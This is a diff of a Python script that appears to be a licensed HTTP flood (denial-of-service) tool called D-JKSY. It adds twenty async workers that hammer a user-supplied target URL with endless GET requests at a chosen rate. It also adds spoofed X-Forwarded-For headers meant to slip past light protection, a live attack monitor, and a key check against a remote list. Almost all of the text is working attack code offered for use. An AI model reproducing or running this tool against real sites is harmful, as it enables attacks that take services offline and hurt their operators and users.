@@ -1,47 +1,101 @@
 import asyncio, aiohttp, requests, time, os, sys
+from datetime import datetime
 from rich.console import Console
 from rich.panel import Panel
+from rich.text import Text
 
 console = Console()
+stats = {"total": 0, "success": 0, "failed": 0, "latency": 0}
+
+async def attack_logic(url, rps_limit):
+    timeout = aiohttp.ClientTimeout(total=10)
+    delay = 1 / rps_limit if rps_limit > 0 else 0
+    
+    async with aiohttp.ClientSession(timeout=timeout) as session:
+        while True:
+            t1 = time.perf_counter()
+            try:
+                # Header Tier S untuk bypass proteksi ringan
+                headers = {
+                    "User-Agent": "D-JKSY/9.3 (Elite-User)",
+                    "X-Forwarded-For": f"{time.time()}"
+                }
+                async with session.get(url, headers=headers) as resp:
+                    stats["latency"] = (time.perf_counter() - t1) * 1000
+                    stats["total"] += 1
+                    if resp.status < 400:
+                        stats["success"] += 1
+                    else:
+                        stats["failed"] += 1
+            except:
+                stats["total"] += 1
+                stats["failed"] += 1
+            
+            if delay > 0:
+                await asyncio.sleep(delay)
+
+async def monitor(duration, target):
+    start_time = time.time()
+    last_total = 0
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+    banner = Text.assemble(
+        ("\n I AM JOKESKYLS ", "bold white on red"),
+        (" D-JKSY v9.3 ELITE EDITION ", "bold red on white")
+    )
+    console.print(banner, justify="center")
+    
+    console.print(Panel(
+        f"[bold white]TARGET  :[/][bold yellow] {target}\n"
+        f"[bold white]STATUS  :[/][bold green] ATTACKING (TIER S ACTIVE)\n"
+        f"[bold white]OWNER   :[/][bold red] @nazisme1930",
+        title="[bold cyan]D-JKSY CONTROL CENTER[/]"
+    ))
+
+    while time.time() - start_time < duration:
+        current_total = stats["total"]
+        rps = current_total - last_total
+        last_total = current_total
+        
+        now = datetime.now().strftime("%H:%M:%S")
+        console.print(
+            f"[dim]{now}[/] [bold cyan]RPS:[/] [white]{rps:<6}[/] "
+            f"[bold magenta]LATENCY:[/] [white]{stats['latency']:.0f}ms[/] "
+            f"[bold green]SUCCESS:[/] [white]{stats['success']}[/] "
+            f"[bold red]FAILED:[/] [white]{stats['failed']}[/]"
+        )
+        await asyncio.sleep(1)
 
 async def main():
-    # 1. Cek Lisensi dari GitHub kamu
+    # 1. Cek Lisensi
     try:
         r = requests.get("https://raw.githubusercontent.com/iamkhy11/d-jksy/main/keys.txt", timeout=10)
         keys = [k.strip() for k in r.text.splitlines()]
     except:
-        console.print("[bold red][!] Gagal terhubung ke server lisensi.[/]")
+        console.print("[bold red][!] Gagal verifikasi lisensi (Koneksi Error).[/]")
         return
 
     os.system('cls' if os.name == 'nt' else 'clear')
+    console.print(Panel("[bold red]D-JKSY v9.3 REMOTE AUTHORITY[/]"), justify="center")
     
-    # PERBAIKAN: justify dipindah ke console.print, bukan di dalam Panel
-    console.print(Panel("[bold white on red] D-JKSY v9.5 BY JOKESKYLS [/]"), justify="center")
-    
-    key_input = console.input("\n[bold yellow][?][/] Enter License Key: ").strip()
+    key_input = console.input("\n[bold yellow][?][/] License Key: ").strip()
     
     if key_input in keys:
         console.print("[bold green][+][/] Access Granted!")
+        time.sleep(1)
         
-        # 2. Input Target
-        url = console.input("[bold cyan][?][/] Target URL (dengan http/https): ")
-        console.print(f"[bold red][!][/] Launching Tier S Attack to {url}...")
+        # 2. Input Parameter
+        target = console.input("[bold cyan][?][/] Target URL: ")
+        duration = int(console.input("[bold cyan][?][/] Duration (sec): "))
+        rps_target = int(console.input("[bold cyan][?][/] RPS Limit (1-1000): "))
         
-        # Worker serangan (Worker ditingkatkan ke 100 untuk Tier S)
-        async with aiohttp.ClientSession() as session:
-            tasks = []
-            for _ in range(100):
-                tasks.append(attack_logic(session, url))
-            await asyncio.gather(*tasks)
+        # 3. Eksekusi
+        # Kita pakai 20 worker untuk membagi beban RPS
+        workers = [attack_logic(target, rps_target/20) for _ in range(20)]
+        
+        # Jalankan monitor dan attack bersamaan
+        await asyncio.gather(monitor(duration, target), *workers)
+        
+        console.print("\n[bold yellow][!] Attack Session Finished.[/]")
     else:
-        console.print("[bold red][!][/] Invalid Key! Contact @nazisme1930")
-
-async def attack_logic(session, url):
-    while True:
-        try:
-            async with session.get(url, timeout=5) as resp:
-                # Menampilkan log sederhana agar user tahu script bekerja
-                print(f"[*] Packets Sent to {url} | Status: {resp.status}")
-        except:
-            pass
-        await asyncio.sleep(0) # Mencegah CPU overheat
+        console.print("[bold red][!][/] Access Denied. Contact @nazisme1930")
